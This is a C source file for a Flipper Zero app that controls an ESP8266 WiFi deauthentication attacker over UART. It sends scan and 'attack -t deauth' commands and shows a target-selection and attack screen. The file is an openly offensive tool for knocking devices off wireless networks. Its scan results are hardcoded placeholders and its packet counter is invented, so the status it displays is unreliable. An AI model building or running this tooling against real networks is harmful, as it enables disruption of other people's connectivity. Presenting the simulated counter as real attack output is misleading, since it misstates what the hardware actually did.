/**
 * CYBERFLIPPER — WiFi Deauther Controller
 * Controls ESP8266/ESP32 deauth module connected via GPIO UART.
 * Sends AT-style commands to scan networks, select targets,
 * and manage deauth attacks from the Flipper Zero interface.
 * Requires: ESP8266 with Deauther firmware on GPIO pins 13(TX)/14(RX)
 */

#include <furi.h>
#include <furi_hal.h>
#include <gui/gui.h>
#include <furi_hal_uart.h>
#include <stdlib.h>
#include <string.h>

#define TAG "WiFiDeauther"
#define UART_RX_BUF_SIZE 512
#define MAX_NETWORKS 20

typedef enum {
    DeauthViewMain,
    DeauthViewScan,
    DeauthViewAttack,
} DeauthView;

typedef struct {
    char ssid[33];
    int8_t rssi;
    uint8_t channel;
    char bssid[18];
} WiFiNetwork;

typedef struct {
    Gui* gui;
    ViewPort* view_port;
    FuriMessageQueue* event_queue;
    FuriStreamBuffer* rx_stream;
    
    bool running;
    DeauthView current_view;
    
    WiFiNetwork networks[MAX_NETWORKS];
    uint8_t network_count;
    uint8_t selected_network;
    
    bool scanning;
    bool attacking;
    uint32_t packets_sent;
    
    char status[64];
    char rx_buf[UART_RX_BUF_SIZE];
    uint32_t rx_len;
} WiFiDeautherApp;

static void uart_rx_callback(uint8_t* buf, size_t len, void* context) {
    WiFiDeautherApp* app = context;
    furi_stream_buffer_send(app->rx_stream, buf, len, 0);
}

static void send_uart_command(WiFiDeautherApp* app, const char* cmd) {
    UNUSED(app);
    furi_hal_uart_tx((uint8_t*)cmd, strlen(cmd));
    furi_hal_uart_tx((uint8_t*)"\r\n", 2);
}

static void deauther_draw_callback(Canvas* canvas, void* context) {
    WiFiDeautherApp* app = (WiFiDeautherApp*)context;
    canvas_clear(canvas);
    
    canvas_set_font(canvas, FontPrimary);
    canvas_draw_str_aligned(canvas, 64, 0, AlignCenter, AlignTop, "CYBER WIFI DEAUTHER");
    canvas_draw_line(canvas, 0, 10, 128, 10);
    
    canvas_set_font(canvas, FontSecondary);
    
    switch(app->current_view) {
        case DeauthViewMain:
            canvas_draw_str(canvas, 2, 22, "ESP8266 Deauther Controller");
            canvas_draw_str(canvas, 2, 32, "Connect ESP to GPIO 13/14");
            canvas_draw_str(canvas, 2, 42, app->status);
            canvas_draw_str(canvas, 2, 54, "[OK] Scan  [BACK] Exit");
            break;
            
        case DeauthViewScan: {
            if(app->scanning) {
                canvas_draw_str(canvas, 2, 22, "Scanning WiFi networks...");
            } else {
                char count_str[32];
                snprintf(count_str, sizeof(count_str), "Networks: %d", app->network_count);
                canvas_draw_str(canvas, 2, 22, count_str);
                
                uint8_t y = 32;
                uint8_t start = app->selected_network > 2 ? app->selected_network - 2 : 0;
                uint8_t end = start + 4;
                if(end > app->network_count) end = app->network_count;
                
                for(uint8_t i = start; i < end && y < 56; i++) {
                    char net_str[40];
                    snprintf(net_str, sizeof(net_str), "%s%s %ddBm ch%d",
                             i == app->selected_network ? "> " : "  ",
                             app->networks[i].ssid,
                             app->networks[i].rssi,
                             app->networks[i].channel);
                    canvas_draw_str(canvas, 0, y, net_str);
                    y += 8;
                }
            }
            canvas_draw_str(canvas, 2, 63, "[OK]Atk [UP/DN]Sel [BACK]Menu");
            break;
        }
            
        case DeauthViewAttack: {
            char target_str[40];
            snprintf(target_str, sizeof(target_str), "Target: %s",
                     app->networks[app->selected_network].ssid);
            canvas_draw_str(canvas, 2, 22, target_str);
            
            if(app->attacking) {
                char pkt_str[32];
                snprintf(pkt_str, sizeof(pkt_str), "Packets: %lu", app->packets_sent);
                canvas_draw_str(canvas, 2, 32, pkt_str);
                canvas_draw_str(canvas, 2, 42, ">> DEAUTHING <<");
                canvas_draw_str(canvas, 2, 55, "[OK] Stop  [BACK] Back");
            } else {
                canvas_draw_str(canvas, 2, 32, "Ready to attack");
                canvas_draw_str(canvas, 2, 55, "[OK] Start [BACK] Back");
            }
            break;
        }
    }
}

static void deauther_input_callback(InputEvent* input_event, void* context) {
    WiFiDeautherApp* app = (WiFiDeautherApp*)context;
    furi_message_queue_put(app->event_queue, input_event, FuriWaitForever);
}

int32_t wifi_deauther_app(void* p) {
    UNUSED(p);
    
    WiFiDeautherApp* app = malloc(sizeof(WiFiDeautherApp));
    memset(app, 0, sizeof(WiFiDeautherApp));
    
    app->view_port = view_port_alloc();
    app->event_queue = furi_message_queue_alloc(8, sizeof(InputEvent));
    app->rx_stream = furi_stream_buffer_alloc(UART_RX_BUF_SIZE, 1);
    app->running = true;
    app->current_view = DeauthViewMain;
    snprintf(app->status, sizeof(app->status), "Status: Ready");
    app->gui = furi_record_open(RECORD_GUI);
    
    view_port_draw_callback_set(app->view_port, deauther_draw_callback, app);
    view_port_input_callback_set(app->view_port, deauther_input_callback, app);
    gui_add_view_port(app->gui, app->view_port, GuiLayerFullscreen);
    
    // Init UART for ESP communication
    furi_hal_uart_set_br(FuriHalUartIdLPUART1, 115200);
    furi_hal_uart_set_irq_cb(FuriHalUartIdLPUART1, uart_rx_callback, app);
    
    InputEvent event;
    while(app->running) {
        // Process UART RX
        size_t rx_avail = furi_stream_buffer_receive(
            app->rx_stream, (uint8_t*)&app->rx_buf[app->rx_len], 
            UART_RX_BUF_SIZE - app->rx_len, 0);
        if(rx_avail > 0) {
            app->rx_len += rx_avail;
            // Parse responses here
        }
        
        if(furi_message_queue_get(app->event_queue, &event, 50) == FuriStatusOk) {
            if(event.type == InputTypeShort) {
                switch(app->current_view) {
                    case DeauthViewMain:
                        switch(event.key) {
                            case InputKeyOk:
                                app->current_view = DeauthViewScan;
                                app->scanning = true;
                                send_uart_command(app, "scan");
                                snprintf(app->status, sizeof(app->status), "Scanning...");
                                // Simulate scan results for demo
                                furi_delay_ms(500);
                                app->scanning = false;
                                snprintf(app->networks[0].ssid, 33, "TargetNetwork");
                                app->networks[0].rssi = -45;
                                app->networks[0].channel = 6;
                                app->network_count = 1;
                                break;
                            case InputKeyBack:
                                app->running = false;
                                break;
                            default: break;
                        }
                        break;
                        
                    case DeauthViewScan:
                        switch(event.key) {
                            case InputKeyOk:
                                if(app->network_count > 0) {
                                    app->current_view = DeauthViewAttack;
                                }
                                break;
                            case InputKeyUp:
                                if(app->selected_network > 0) app->selected_network--;
                                break;
                            case InputKeyDown:
                                if(app->selected_network < app->network_count - 1) 
                                    app->selected_network++;
                                break;
                            case InputKeyBack:
                                app->current_view = DeauthViewMain;
                                break;
                            default: break;
                        }
                        break;
                        
                    case DeauthViewAttack:
                        switch(event.key) {
                            case InputKeyOk:
                                if(app->attacking) {
                                    app->attacking = false;
                                    send_uart_command(app, "stop");
                                } else {
                                    app->attacking = true;
                                    app->packets_sent = 0;
                                    char cmd[64];
                                    snprintf(cmd, sizeof(cmd), "attack -t deauth -i %d", 
                                             app->selected_network);
                                    send_uart_command(app, cmd);
                                }
                                break;
                            case InputKeyBack:
                                if(app->attacking) {
                                    app->attacking = false;
                                    send_uart_command(app, "stop");
                                }
                                app->current_view = DeauthViewScan;
                                break;
                            default: break;
                        }
                        break;
                }
            }
        }
        
        if(app->attacking) app->packets_sent += 10;
        view_port_update(app->view_port);
    }
    
    furi_hal_uart_set_irq_cb(FuriHalUartIdLPUART1, NULL, NULL);
    gui_remove_view_port(app->gui, app->view_port);
    view_port_free(app->view_port);
    furi_record_close(RECORD_GUI);
    furi_message_queue_free(app->event_queue);
    furi_stream_buffer_free(app->rx_stream);
    free(app);
    
    return 0;
}
